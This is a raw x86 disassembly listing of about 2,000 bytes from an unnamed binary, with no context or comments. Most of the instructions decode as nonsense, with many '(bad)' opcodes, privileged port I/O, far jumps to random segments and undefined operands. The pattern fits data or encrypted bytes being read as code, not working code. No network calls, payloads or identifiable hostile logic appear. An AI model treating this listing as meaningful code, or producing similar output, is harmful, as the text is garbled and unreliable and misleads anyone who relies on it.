  426ad4:	xchg   DWORD PTR [esi],ebx
  426ad6:	and    BYTE PTR [edi-0x57f96e19],0x37
  426add:	and    al,0x77
  426adf:	dec    eax
  426ae0:	push   es
  426ae1:	cdq    
  426ae2:	fist   DWORD PTR [eax]
  426ae4:	mov    bh,0x50
  426ae6:	leave  
  426ae7:	adc    esp,DWORD PTR [ecx-0x6718019c]
  426aed:	xchg   edx,eax
  426aee:	dec    ecx
  426aef:	(bad)  
  426af0:	cmp    al,0x6b
  426af2:	outs   dx,DWORD PTR ds:[esi]
  426af3:	and    al,0xcf
  426af5:	or     BYTE PTR [ebx],bh
  426af7:	cmc    
  426af8:	mov    ah,dh
  426afa:	pusha  
  426afb:	ds inc esp
  426afd:	scas   al,BYTE PTR es:[edi]
  426afe:	dec    eax
  426aff:	xor    al,0x73
  426b01:	xor    edx,DWORD PTR ds:0x37718a15
  426b07:	ds dec eax
  426b09:	pushf  
  426b0a:	push   edx
  426b0b:	jp     0x426b30
  426b0d:	(bad)  
  426b0e:	(bad)  
  426b0f:	cwde   
  426b10:	ds dec esp
  426b12:	test   BYTE PTR [eax+ecx*1+0x14],dl
  426b16:	dec    ecx
  426b17:	xor    al,0x25
  426b19:	and    DWORD PTR [edx+0x3e],edi
  426b1c:	push   edi
  426b1d:	or     al,0xf1
  426b1f:	aaa    
  426b20:	xchg   esi,eax
  426b21:	xor    dh,al
  426b23:	push   cs
  426b24:	shl    ebp,0xc6
  426b27:	pop    ebx
  426b28:	fxch   st(0)
  426b2a:	pop    bp
  426b2c:	mov    dl,0x28
  426b2e:	inc    edx
  426b2f:	outs   dx,DWORD PTR ds:[esi]
  426b30:	adc    ch,0x3a
  426b33:	mov    ?,esp
  426b35:	adc    bl,BYTE PTR [ebp+ebx*2+0x51]
  426b39:	pop    ds
  426b3a:	test   DWORD PTR [ebp-0xcef832a],edi
  426b40:	ja     0x426b36
  426b42:	mov    ah,0xb8
  426b44:	push   esp
  426b45:	into   
  426b46:	psllw  mm2,QWORD PTR [ebp-0x63]
  426b4a:	rcl    DWORD PTR [edi],0xc5
  426b4d:	jno    0x426b45
  426b4f:	dec    esp
  426b50:	lods   al,BYTE PTR ds:[esi]
  426b51:	jmp    0xabd4:0xe167dbb0
  426b58:	pop    ss
  426b59:	mov    ah,0xe5
  426b5b:	pop    eax
  426b5c:	test   eax,0x37840b06
  426b61:	div    al
  426b63:	dec    edi
  426b64:	mov    esi,0x661fc2f
  426b69:	(bad)
  426b6d:	or     edi,DWORD PTR [ebx-0x5d75446b]
  426b73:	ret    
  426b74:	retf   
  426b75:	out    dx,eax
  426b76:	dec    esp
  426b77:	ja     0x426b39
  426b79:	mov    WORD PTR [ebp-0x27f85a2d],gs
  426b7f:	push   ds
  426b80:	add    ah,BYTE PTR [ecx+0x0]
  426b83:	add    BYTE PTR [eax],al
  426b85:	add    BYTE PTR [eax],al
  426b87:	add    BYTE PTR [eax],al
  426b89:	add    BYTE PTR [edi+0x56],al
  426b8c:	dec    esp
  426b8d:	inc    edx
  426b8e:	pop    ebp
  426b8f:	pop    edx
  426b90:	dec    edi
  426b91:	push   edi
  426b92:	dec    edx
  426b93:	push   es
  426b94:	enter  0xe281,0x3d
  426b98:	mov    esi,0x1f8d002
  426b9d:	add    BYTE PTR [ebx+0x6],bh
  426ba0:	add    BYTE PTR [eax],al
  426ba2:	ret    0xbec0
  426ba5:	mov    ebx,esp
  426ba7:	and    BYTE PTR [ecx],0x31
  426baa:	mov    dh,ah
  426bac:	fisubr DWORD PTR [ecx-0x11]
  426baf:	sub    ax,0xdf19
  426bb3:	ja     0x426b55
  426bb5:	lods   eax,DWORD PTR ds:[esi]
  426bb6:	push   0x8d778c31
  426bbb:	and    eax,eax
  426bbd:	cmp    al,bl
  426bbf:	sub    BYTE PTR [ecx],0xa3
  426bc2:	call   0xa4ac979c
  426bc7:	js     0x426bfe
  426bc9:	push   edx
  426bca:	or     al,0xde
  426bcc:	jecxz  0x426bfc
  426bce:	pop    edi
  426bcf:	aas    
  426bd0:	sub    bh,cl
  426bd2:	out    dx,al
  426bd3:	pop    ecx
  426bd4:	pop    ebx
  426bd5:	dec    ebx
  426bd6:	mov    esi,0xc3591c98
  426bdb:	(bad)  
  426bdc:	pop    eax
  426bdd:	push   es
  426bde:	aad    0x24
  426be0:	sbb    al,0x6b
  426be2:	loope  0x426ba9
  426be4:	repz sub ecx,DWORD PTR [esi]
  426be7:	pop    esp
  426be8:	pop    esi
  426be9:	es jbe 0x426b6d
  426bec:	or     bl,BYTE PTR [edi-0x56e4559a]
  426bf2:	mov    edi,0xa435b70b
  426bf7:	not    eax
  426bf9:	xchg   ebp,eax
  426bfa:	xchg   esi,eax
  426bfb:	cmp    esp,esi
  426bfd:	jbe    0x426c10
  426bff:	je     0x426c7b
  426c01:	jbe    0x426baa
  426c03:	cli    
  426c04:	into   
  426c05:	out    dx,eax
  426c06:	xor    ah,BYTE PTR [esi+eiz*8]
  426c09:	add    edi,DWORD PTR [ecx-0x31]
  426c0c:	outs   dx,DWORD PTR ds:[esi]
  426c0d:	push   ecx
  426c0e:	jle    0x426bf0
  426c10:	clc    
  426c11:	je     0x426c0e
  426c13:	(bad)  [edx+0x42]
  426c16:	retf   
  426c17:	icebp  
  426c18:	addr16 ss lahf 
  426c1b:	lds    ebx,FWORD PTR cs:[edi]
  426c1e:	jae    0x426bd6
  426c20:	or     ebp,DWORD PTR [ebx-0x2ae31c28]
  426c26:	repz out 0x97,al
  426c29:	ins    BYTE PTR es:[edi],dx
  426c2a:	sbb    BYTE PTR [edi+0x54ff3b9d],al
  426c30:	dec    ebx
  426c31:	sub    ebx,DWORD PTR [esi+0x73]
  426c34:	fnstsw WORD PTR ds:0x9da375fc
  426c3a:	rol    DWORD PTR [edi-0x6693647a],0xf4
  426c41:	and    BYTE PTR [eax+0x78],ch
  426c44:	push   ecx
  426c45:	(bad)  
  426c46:	dec    edx
  426c47:	jne    0x426bdc
  426c49:	cmp    eax,0x98722ddd
  426c4e:	retf   
  426c4f:	popf   
  426c50:	and    ax,0xc65f
  426c54:	sbb    al,0xcf
  426c56:	jb     0x426c07
  426c58:	xor    ecx,DWORD PTR [edx-0x1c87338e]
  426c5e:	xlat   BYTE PTR ds:[ebx]
  426c5f:	jle    0x426c80
  426c61:	adc    DWORD PTR [edx],ecx
  426c63:	push   esi
  426c64:	mov    ch,0x8e
  426c66:	jb     0x426c1c
  426c68:	out    dx,al
  426c69:	(bad)  
  426c6a:	jge    0x426c2d
  426c6c:	mov    ch,0xf6
  426c6e:	aaa    
  426c6f:	and    bh,BYTE PTR [esi+0x18]
  426c72:	outs   dx,DWORD PTR ds:[esi]
  426c73:	jecxz  0x426cd2
  426c75:	gs mov edi,0x6280a7a
  426c7b:	ins    DWORD PTR es:[edi],dx
  426c7c:	and    eax,0x4e550b87
  426c81:	add    DWORD PTR [edi-0x28cf4089],ebx
  426c87:	fld    DWORD PTR [ebp-0x446fa1d9]
  426c8d:	mov    DWORD PTR [ecx-0x7f],esi
  426c90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c91:	push   ebp
  426c92:	(bad)  
  426c93:	and    ecx,ebx
  426c95:	gs int3 
  426c97:	outs   dx,BYTE PTR ds:[esi]
  426c98:	jmp    0xefb9:0x65f2dd4a
  426c9f:	imul   ebx,DWORD PTR [ebx+0x35e6bd6e],0xffffffe9
  426ca6:	jmp    0x426c2a
  426ca8:	cmc    
  426ca9:	add    DWORD PTR [edx-0x3c806e7],edi
  426caf:	xchg   ebp,eax
  426cb0:	fdiv   QWORD PTR [edi+0x31]
  426cb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426cb4:	xor    ah,BYTE PTR ds:0x1e583656
  426cba:	dec    edx
  426cbb:	adc    al,BYTE PTR [edx-0x47cd027f]
  426cc1:	pusha  
  426cc2:	push   eax
  426cc3:	mov    dh,0x23
  426cc5:	or     DWORD PTR [edi],esi
  426cc7:	cmp    al,BYTE PTR [edx]
  426cc9:	aaa    
  426cca:	(bad)  
  426ccb:	jp     0x426c65
  426ccd:	and    ebp,0xfffffff8
  426cd0:	adc    DWORD PTR [ecx+ebp*4],0xec28a1d1
  426cd7:	pop    ebp
  426cd8:	sbb    DWORD PTR [ebx+0x63],edx
  426cdb:	popa   
  426cdc:	and    BYTE PTR [ebp+0x37a91694],cl
  426ce2:	mov    ds:0xc1982d8a,al
  426ce7:	popf   
  426ce8:	cld    
  426ce9:	inc    ebp
  426cea:	sar    BYTE PTR [edi+eiz*4-0xb5ee3d3],1
  426cf1:	imul   ebx,DWORD PTR [ebx],0x31653161
  426cf7:	mov    ebx,0xd82a8690
  426cfc:	test   al,0x88
  426cfe:	mov    al,0x3a
  426d00:	add    eax,0x8a7d6cd2
  426d05:	leave  
  426d06:	js     0x426c94
  426d08:	popf   
  426d09:	mov    dl,0x2d
  426d0b:	(bad)  
  426d0c:	(bad)  
  426d0e:	mov    ecx,0xd69421b
  426d13:	mov    ah,BYTE PTR [edx+edi*4]
  426d16:	cmp    al,BYTE PTR [ecx+0x7dda1bf9]
  426d1c:	sbb    BYTE PTR [ebp-0xc],cl
  426d1f:	adc    ah,BYTE PTR [ebp+ebp*8+0x4956091f]
  426d26:	retf   
  426d27:	mov    ecx,0xcc6c5233
  426d2c:	jns    0x426d05
  426d2e:	sbb    DWORD PTR [eax],0x94cfc784
  426d34:	pop    edi
  426d35:	lds    esi,FWORD PTR [ebx]
  426d37:	and    al,0xed
  426d39:	es xchg esp,eax
  426d3b:	mov    bh,0xc4
  426d3d:	dec    edi
  426d3e:	cld    
  426d3f:	pop    es
  426d40:	xor    eax,0xd14b6491
  426d45:	push   DWORD PTR [esi-0x9]
  426d48:	stos   DWORD PTR es:[edi],eax
  426d49:	push   ss
  426d4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d4b:	xchg   BYTE PTR [ecx-0x59],al
  426d4e:	daa    
  426d4f:	mov    ch,0xb
  426d51:	or     edx,0x84482b22
  426d57:	out    dx,al
  426d58:	mov    ebx,0xc952b297
  426d5d:	sar    edi,0xf0
  426d60:	sbb    ebx,DWORD PTR [edx-0x35]
  426d63:	add    BYTE PTR [eax-0x71],ah
  426d66:	mov    edi,0xe7b81050
  426d6b:	or     ah,BYTE PTR [ebx]
  426d6d:	outs   dx,BYTE PTR ds:[esi]
  426d6e:	mov    eax,0xd74ab88b
  426d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d74:	outs   dx,BYTE PTR ds:[esi]
  426d75:	push   ebp
  426d76:	or     dl,dl
  426d78:	mov    ds:0x82865b0b,al
  426d7d:	(bad)  
  426d7f:	jmp    0x426d6d
  426d81:	into   
  426d82:	push   ebp
  426d83:	pop    ds
  426d84:	aad    0x80
  426d86:	pop    ds
  426d87:	sub    al,0xd1
  426d89:	inc    eax
  426d8a:	retf   0x4f2d
  426d8d:	mov    dl,0xd6
  426d8f:	mov    eax,ds:0x3ea9b130
  426d94:	dec    ebp
  426d95:	ror    DWORD PTR [ecx],cl
  426d97:	cmp    cl,BYTE PTR [edx]
  426d99:	cli    
  426d9a:	aam    0xe8
  426d9c:	xchg   edx,eax
  426d9d:	pop    ds
  426d9e:	pop    edx
  426d9f:	out    0xaa,al
  426da1:	xlat   BYTE PTR ds:[ebx]
  426da2:	fstp   TBYTE PTR [edi+0x22]
  426da5:	mov    ds:0xfbc0afd5,eax
  426daa:	dec    edi
  426dab:	mov    esp,0x8ee26cd8
  426db0:	js     0x426d7e
  426db2:	mov    cl,0x39
  426db4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426db5:	hlt    
  426db6:	lahf   
  426db7:	push   edx
  426db8:	xchg   ebp,eax
  426db9:	mov    ?,ecx
  426dbb:	out    dx,eax
  426dbc:	xor    ebx,DWORD PTR [edx-0xf]
  426dbf:	leave  
  426dc0:	ins    BYTE PTR es:[edi],dx
  426dc1:	je     0x426dee
  426dc3:	inc    edi
  426dc4:	fs out 0x41,eax
  426dc7:	inc    DWORD PTR [esi-0x66]
  426dca:	push   cs
  426dcb:	lahf   
  426dcc:	adc    DWORD PTR [ebx+0x22],esi
  426dcf:	or     ch,BYTE PTR [edx+0x11]
  426dd2:	jge    0x426d66
  426dd4:	sbb    esi,DWORD PTR [esi+0x20131c00]
  426dda:	shr    BYTE PTR [edi-0x75616b1c],0x51
  426de1:	mov    ah,0xce
  426de3:	shl    bl,1
  426de5:	lods   al,BYTE PTR ds:[esi]
  426de6:	retf   0x83f0
  426de9:	dec    ebx
  426dea:	mov    cl,0x52
  426dec:	ret    
  426ded:	push   es
  426dee:	idiv   ah
  426df0:	xor    al,0x57
  426df2:	(bad)  
  426df3:	push   0xffffffcf
  426df5:	mov    gs,WORD PTR [esi-0x52]
  426df8:	xor    DWORD PTR [eax+0x202699a7],0x66
  426dff:	mov    BYTE PTR [ecx-0x5638400e],al
  426e05:	inc    edx
  426e06:	mov    dh,0x5b
  426e08:	add    al,0x33
  426e0a:	sbb    DWORD PTR [esi-0x2ea665b1],edi
  426e10:	sub    BYTE PTR [edx+0xd],0x9
  426e14:	cmp    DWORD PTR [esi+0x78],ebp
  426e17:	mov    ds:0xac1f4a1a,eax
  426e1c:	lds    ecx,FWORD PTR [eax+0x3d8e2d37]
  426e22:	jecxz  0x426dc8
  426e24:	aad    0x8e
  426e26:	mov    al,0x14
  426e28:	in     al,0xb
  426e2a:	mov    WORD PTR [ebx-0x66900d1a],?
  426e30:	loope  0x426e0c
  426e32:	jns    0x426e6b
  426e34:	sub    ch,dh
  426e36:	jle    0x426dfd
  426e38:	xchg   DWORD PTR [eax+0x5c],edi
  426e3b:	arpl   sp,sp
  426e3d:	adc    DWORD PTR ds:0xb8a4ff00,0x42eb8508
  426e47:	mov    bl,0x97
  426e49:	and    DWORD PTR [ebp+0x55d897f4],ebx
  426e4f:	adc    edx,edx
  426e51:	mov    ah,0xee
  426e53:	jae    0x426df7
  426e55:	rcl    DWORD PTR [edi],0xa1
  426e58:	lds    ebx,FWORD PTR [ecx+0x55]
  426e5b:	dec    edx
  426e5c:	test   al,0x19
  426e5e:	sbb    eax,0x73ae9df4
  426e63:	imul   BYTE PTR [eax+0x59]
  426e66:	inc    edx
  426e67:	repnz push eax
  426e69:	cdq    
  426e6a:	xchg   esp,eax
  426e6b:	shl    BYTE PTR [ebx+0x58c2ab07],0xdb
  426e72:	vpacksswb ymm7,ymm2,YMMWORD PTR [eax+0x6c]
  426e77:	push   ebx
  426e78:	sbb    al,0xfc
  426e7a:	sbb    ah,al
  426e7c:	jb     0x426e37
  426e7e:	adc    BYTE PTR [edx-0x5b84c699],bh
  426e84:	outs   dx,BYTE PTR ds:[esi]
  426e85:	stc    
  426e86:	bound  eax,QWORD PTR [esi]
  426e88:	aam    0xcb
  426e8a:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  426e8c:	arpl   bp,ax
  426e8e:	hlt    
  426e8f:	lods   al,BYTE PTR ds:[esi]
  426e90:	(bad)  
  426e92:	adc    eax,0x416d54dd
  426e97:	push   eax
  426e98:	xchg   ecx,eax
  426e99:	retf   0xdb41
  426e9c:	mov    DWORD PTR [esi-0x62a25f32],eax
  426ea2:	push   edx
  426ea3:	pop    edx
  426ea4:	fwait
  426ea5:	pop    ds
  426ea6:	out    0xa6,eax
  426ea8:	dec    eax
  426ea9:	fcom   st(4)
  426eab:	dec    edi
  426eac:	in     eax,0xb1
  426eae:	mov    bh,0x83
  426eb0:	sub    DWORD PTR [ebp+0x75ea1f85],edi
  426eb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426eb7:	xor    DWORD PTR [edx+ecx*4-0x74],ebp
  426ebb:	clc    
  426ebc:	inc    ecx
  426ebd:	ins    BYTE PTR es:[edi],dx
  426ebe:	lahf   
  426ebf:	adc    eax,0x672d0657
  426ec4:	paddd  mm1,QWORD PTR [edi+0x8]
  426ec8:	mov    ds:0xc6a9731e,eax
  426ecd:	je     0x426f05
  426ecf:	jmp    0xc61bb653
  426ed4:	jb     0x426ecc
  426ed6:	pop    esp
  426ed7:	popa   
  426ed8:	sar    BYTE PTR [edi-0x3f],cl
  426edb:	dec    edx
  426edc:	xor    DWORD PTR [ebx-0x35b93f43],ecx
  426ee2:	adc    dh,bl
  426ee4:	jge    0x426ec0
  426ee6:	jns    0x426e7d
  426ee8:	dec    edx
  426ee9:	cmc    
  426eea:	push   ebx
  426eeb:	(bad)  
  426eed:	fnstsw WORD PTR [edx-0x369e9e13]
  426ef3:	add    eax,0x2cab5f5
  426ef8:	ret    0xe512
  426efb:	pop    ss
  426efc:	jnp    0x426f2b
  426efe:	jl     0x426eb0
  426f00:	out    dx,al
  426f01:	jmp    0xf031:0x53337538
  426f08:	jle    0x426ec7
  426f0a:	rol    BYTE PTR [ebx],cl
  426f0c:	test   al,0x74
  426f0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f0f:	pop    edi
  426f10:	and    eax,0x684b21c4
  426f15:	ins    DWORD PTR es:[edi],dx
  426f16:	fidivr WORD PTR [edx]
  426f18:	sbb    eax,DWORD PTR [edx]
  426f1a:	call   0xc711:0xd0c21603
  426f21:	push   cs
  426f22:	mov    ebx,0xa65d4348
  426f27:	lea    eax,[ebp+0xa]
  426f2a:	xlat   BYTE PTR ds:[ebx]
  426f2b:	mov    edi,DWORD PTR [esi-0x15]
  426f2e:	mov    ebx,0x2cfebca7
  426f33:	xchg   BYTE PTR [ebp-0x6c361985],bh
  426f39:	xchg   BYTE PTR [ecx-0x6c6d0b45],bh
  426f3f:	xchg   edi,eax
  426f40:	mov    eax,0x340938ce
  426f45:	cld    
  426f46:	mov    ebx,0x67b85454
  426f4b:	sub    DWORD PTR [edx+ecx*8-0x4a],esp
  426f4f:	push   edx
  426f50:	ret    
  426f51:	inc    ecx
  426f52:	aas    
  426f53:	adc    DWORD PTR ds:0x5be0e0d,edx
  426f59:	jle    0x426fd4
  426f5b:	jb     0x426fb6
  426f5d:	and    BYTE PTR [ecx],bl
  426f5f:	in     eax,dx
  426f60:	popf   
  426f61:	jg     0x426ee5
  426f63:	mov    dl,0xa8
  426f65:	mov    al,ds:0xd464c915
  426f6a:	or     bh,BYTE PTR [ebx]
  426f6c:	adc    ah,cl
  426f6e:	dec    edi
  426f6f:	test   eax,0xe971266
  426f74:	sbb    al,0xb3
  426f76:	sub    eax,0xa5c64e08
  426f7b:	loopne 0x426fe4
  426f7d:	jnp    0x426ff0
  426f7f:	and    eax,0xcbe68864
  426f84:	add    cl,BYTE PTR [edx]
  426f86:	pop    ebx
  426f87:	and    BYTE PTR [ebx],bl
  426f89:	fwait
  426f8a:	mov    esi,es
  426f8c:	stos   DWORD PTR es:[edi],eax
  426f8d:	(bad)  
  426f8e:	in     al,0x97
  426f90:	and    esp,DWORD PTR [edi-0x66308e99]
  426f96:	test   DWORD PTR [ebx],ebx
  426f98:	sub    BYTE PTR [ecx+ebp*1+0x61149104],dh
  426f9f:	mov    dl,0xc2
  426fa1:	aas    
  426fa2:	jg     0x426f9d
  426fa4:	xchg   esi,eax
  426fa5:	in     eax,dx
  426fa6:	push   ss
  426fa7:	sti    
  426fa8:	mov    ebp,ecx
  426faa:	in     eax,0xc5
  426fac:	mov    esp,0xb600b81d
  426fb1:	jae    0x426f72
  426fb3:	in     al,dx
  426fb4:	jo     0x426f94
  426fb6:	sub    al,0x6c
  426fb8:	not    dl
  426fba:	imul   BYTE PTR ds:[eax+eax*2-0x8]
  426fbf:	popf   
  426fc0:	pop    edx
  426fc1:	dec    esp
  426fc2:	mov    edi,0x67de0060
  426fc7:	test   DWORD PTR [edi],esi
  426fc9:	mov    eax,0x41e78f4
  426fce:	je     0x426f64
  426fd0:	or     al,0x44
  426fd2:	addr16 adc al,0xe1
  426fd5:	fiadd  WORD PTR [edx]
  426fd7:	xor    eax,0xa18d75a2
  426fdc:	sahf   
  426fdd:	and    BYTE PTR [esi],0x25
  426fe0:	(bad)  
  426fe2:	sbb    al,BYTE PTR [edi+0x53b52664]
  426fe8:	add    cl,BYTE PTR [edi]
  426fea:	add    ecx,esi
  426fec:	add    al,0x8a
  426fee:	inc    ebp
  426fef:	xor    DWORD PTR [edx+0x48],eax
  426ff2:	dec    ebp
  426ff3:	adc    ch,dh
  426ff5:	ins    DWORD PTR es:[edi],dx
  426ff6:	lds    edi,FWORD PTR [esi]
  426ff8:	jb     0x426fa9
  426ffa:	ja     0x42702f
  426ffc:	xchg   edx,eax
  426ffd:	jne    0x42704a
  426fff:	rcr    BYTE PTR [edi],0x30
  427002:	std    
  427003:	xor    bh,ch
  427005:	mov    ch,0x41
  427007:	or     dh,BYTE PTR [ebx-0x56]
  42700a:	call   0x2f724a04
  42700f:	inc    ebx
  427010:	arpl   WORD PTR [edx+0x24],cx
  427013:	jmp    0x3320:0xae915b2b
  42701a:	cdq    
  42701b:	mov    eax,ds:0x304399ce
  427020:	cmp    al,0x88
  427022:	mov    ecx,0x9670be77
  427027:	mov    esp,0xd75f7c9d
  42702c:	push   ebp
  42702d:	pushf  
  42702e:	clc    
  42702f:	ds int 0x2b
  427032:	fisttp WORD PTR [esi]
  427034:	cdq    
  427035:	arpl   si,di
  427037:	jno    0x4270af
  427039:	out    0xa6,al
  42703b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42703c:	or     ebp,DWORD PTR [eax-0x33cce5e0]
  427042:	aas    
  427043:	push   0x921c0076
  427048:	inc    ebp
  427049:	or     esi,ebx
  42704b:	xor    al,0x3b
  42704d:	cmp    DWORD PTR [ebx-0x3b],0x38
  427051:	jle    0x426fe1
  427053:	fild   QWORD PTR [eax+0x4f]
  427056:	shl    DWORD PTR [edi-0x2b],0xfc
  42705a:	(bad)  
  42705b:	mov    fs,WORD PTR [edx]
  42705d:	push   esi
  42705e:	cmp    DWORD PTR [ebp+ecx*4-0x109e4412],eax
  427065:	or     al,0xf0
  427067:	test   DWORD PTR [ecx+0x48],esp
  42706a:	dec    eax
  42706b:	clc    
  42706c:	push   edx
  42706d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42706e:	das    
  42706f:	pop    es
  427070:	cmp    eax,0x69b7ec5c
  427075:	popf   
  427076:	xor    eax,eax
  427078:	(bad)  
  427079:	leave  
  42707a:	or     esp,0x3d
  42707d:	and    BYTE PTR [eax+0x69dcf219],bh
  427083:	mov    gs,WORD PTR [ebx-0x1b]
  427086:	push   ebp
  427087:	cwde   
  427088:	adc    DWORD PTR [edx],edi
  42708a:	dec    edi
  42708b:	pop    es
  42708c:	push   edi
  42708d:	sbb    BYTE PTR ds:0x511506b0,dl
  427093:	jne    0x4270e2
  427095:	call   0x670da0dd
  42709a:	ret    0xbc50
  42709d:	pop    ds
  42709e:	in     eax,0x41
  4270a0:	ret    
  4270a1:	xor    eax,0x18594a94
  4270a6:	loope  0x427050
  4270a8:	inc    edi
  4270a9:	dec    eax
  4270aa:	jmp    0xabfb:0x4fcb9233
  4270b1:	addr16 je 0x4270f7
  4270b4:	xchg   BYTE PTR [ebx-0x2b6d0c86],bh
  4270ba:	dec    edx
  4270bb:	add    bl,BYTE PTR [ebx-0x38]
  4270be:	push   0xffffffc6
  4270c0:	cmp    eax,0x3a3ae1ca
  4270c5:	jnp    0x427117
  4270c7:	(bad)  
  4270c8:	fld    DWORD PTR [esi+0x26]
  4270cb:	inc    edi
  4270cc:	fmul   st,st(6)
  4270ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4270cf:	jb     0x427101
  4270d1:	pop    ebx
  4270d2:	dec    edi
  4270d3:	push   cs
  4270d4:	lea    edi,[ebx+0x78]
  4270d7:	adc    al,0x23
  4270d9:	mov    ecx,ecx
  4270db:	idiv   DWORD PTR [ecx+0x4fd540a8]
  4270e1:	pop    es
  4270e2:	dec    ecx
  4270e3:	pop    es
  4270e4:	adc    eax,DWORD PTR [edi+0x455993b7]
  4270ea:	test   eax,ecx
  4270ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4270ed:	mov    bh,0x4c
  4270ef:	cmp    edi,DWORD PTR [edx+0x5f2e7c46]
  4270f5:	sub    al,0x88
  4270f7:	lds    esi,FWORD PTR [eax-0x305bcdba]
  4270fd:	gs arpl ax,ax
  427100:	xor    DWORD PTR [eax],esi
  427102:	pop    ebx
  427103:	out    dx,al
  427104:	(bad)  
  427105:	xchg   edi,eax
  427106:	sar    DWORD PTR [esi+0xa5bcc95],1
  42710c:	pop    ebx
  42710d:	retf   0xc332
  427110:	inc    eax
  427111:	xchg   BYTE PTR [edi+0x7f],ch
  427114:	les    ebp,FWORD PTR [edx]
  427116:	jb     0x427164
  427118:	arpl   WORD PTR ds:[esi+ebp*2-0xb],dx
  42711d:	cmp    al,0x72
  42711f:	push   cs
  427120:	mov    DWORD PTR [ebx+0x5f],edx
  427123:	xor    esp,DWORD PTR [ebx]
  427125:	xchg   esp,eax
  427126:	push   0x37
  427128:	in     eax,0x8e
  42712a:	jb     0x42710a
  42712c:	and    eax,0xba4b1c53
  427131:	icebp  
  427132:	inc    ebx
  427133:	call   0x963de40b
  427138:	mov    WORD PTR [esi-0x69],gs
  42713b:	ret    
  42713c:	in     al,dx
  42713d:	sub    dl,BYTE PTR [edi+0x6]
  427140:	out    0xcb,eax
  427142:	cdq    
  427143:	sub    al,0x4a
  427145:	mov    edi,ecx
  427147:	es cdq 
  427149:	jo     0x427158
  42714b:	clc    
  42714c:	mov    eax,0x63425da0
  427151:	mov    eax,ds:0xc46f7212
  427156:	or     eax,0x8a68ff97
  42715b:	push   ss
  42715c:	mov    eax,ds:0x8e16ee8e
  427161:	adc    dh,bh
  427163:	(bad)  
  427164:	sar    bh,cl
  427166:	mov    ds:0xc97997e6,eax
  42716b:	div    BYTE PTR [eax]
  42716d:	inc    eax
  42716e:	icebp  
  42716f:	jl     0x4271e0
  427171:	pop    ds
  427172:	out    0x7b,eax
  427174:	je     0x4271a9
  427176:	das    
  427177:	(bad)  
  427178:	or     eax,0x559c8c14
  42717d:	dec    esp
  42717e:	popa   
  42717f:	scas   al,BYTE PTR es:[edi]
  427180:	add    al,0xf5
  427182:	mov    dh,0xe7
  427184:	cmp    cl,BYTE PTR ds:0xf35451bc
  42718a:	xchg   di,ax
  42718c:	mov    edx,0x231f47e5
  427191:	dec    eax
  427192:	test   esi,edi
  427194:	adc    al,0xa4
  427196:	outs   dx,BYTE PTR ds:[esi]
  427197:	xchg   ebp,eax
  427198:	mov    esp,0xb0c188a1
  42719d:	and    bl,ah
  42719f:	xchg   ebx,eax
  4271a0:	xor    al,0x24
  4271a2:	add    DWORD PTR [edi-0x3d],ecx
  4271a5:	mov    ebx,0xa826b84
  4271aa:	es jg  0x427208
  4271ad:	xor    al,0x9f
  4271af:	lea    ebp,[eax-0x25d3644c]
  4271b5:	jns    0x427212
  4271b7:	mov    bl,0x5
  4271b9:	sti    
  4271ba:	sti    
  4271bb:	adc    DWORD PTR [ebx],eax
  4271bd:	pop    ss
  4271be:	shr    DWORD PTR [ebx+0x18],1
  4271c1:	mov    gs,WORD PTR [edi+ebx*2]
  4271c4:	jo     0x42722e
  4271c6:	mov    ds:0x9b0bbf4b,al
  4271cb:	adc    al,0x17
  4271cd:	test   DWORD PTR [eax],ebp
  4271cf:	gs popf 
  4271d1:	jg     0x4271fc
  4271d3:	enter  0x638d,0x75
  4271d7:	outs   dx,BYTE PTR es:[esi]
  4271d9:	push   ss
  4271da:	sub    eax,0xfc10c7ee
  4271df:	cmp    al,0xb3
  4271e1:	repnz sub al,0x7a
  4271e4:	dec    eax
  4271e5:	dec    esp
  4271e6:	push   esi
  4271e7:	mov    ebp,0x2fa49cf9
  4271ec:	mov    edi,0xa4b50338
  4271f1:	(bad)  
  4271f2:	in     eax,0xc3
  4271f4:	pop    ebx
  4271f5:	lods   eax,DWORD PTR ds:[esi]
  4271f6:	xor    cl,BYTE PTR [ecx-0x413a79a9]
  4271fc:	mov    edx,0x631b96e6
  427201:	mov    cl,0x9a
  427203:	rcr    ah,1
  427205:	and    dh,dh
  427207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427208:	in     eax,dx
  427209:	jle    0x4271fc
  42720b:	push   ss
  42720c:	jle    0x427199
  42720e:	xchg   edi,eax
  42720f:	dec    eax
  427210:	(bad)  
  427211:	aam    0x4b
  427213:	das    
  427214:	push   cs
  427215:	pop    ebx
  427216:	pop    ebp
  427217:	fdivp  st(4),st
  427219:	sahf   
  42721a:	test   dh,cl
  42721c:	mov    ds:0x0,al
	...
  427229:	add    BYTE PTR [ebp+0x55],cl
  42722c:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  427232:	mov    esp,ebp
  427234:	or     al,ah
  427236:	dec    ebp
  427237:	add    bh,al
  427239:	add    BYTE PTR [eax],cl
  42723b:	add    BYTE PTR [eax],al
  42723d:	mov    DWORD PTR [eax],0x3ef44545
  427243:	cmp    BYTE PTR [eax],al
  427245:	test   DWORD PTR [ebx-0x34070b64],ecx
  42724b:	(bad)  
  42724c:	enter  0x4d45,0xb8
  427250:	mov    edi,DWORD PTR [ecx]
  427252:	hlt    
  427253:	test   ebx,ecx
  427255:	pushf  
  427256:	enter  0x4df8,0x8b
  42725a:	mov    DWORD PTR [ebp+0x8],0x894708
  427261:	inc    ebp
  427262:	mov    ebp,0xff8bfffc
  427267:	dec    ebp
  427268:	mov    ch,0xf4
  42726a:	call   DWORD PTR [ebx-0x1]
  42726d:	mov    ebx,0x8005022
  427272:	call   DWORD PTR [ecx+0x8]
  427275:	pop    es
  427276:	jmp    0xb8:0x9cb4533
  42727d:	cwde   
  42727e:	mov    esi,DWORD PTR [edx-0xc]
  427281:	xor    al,bl
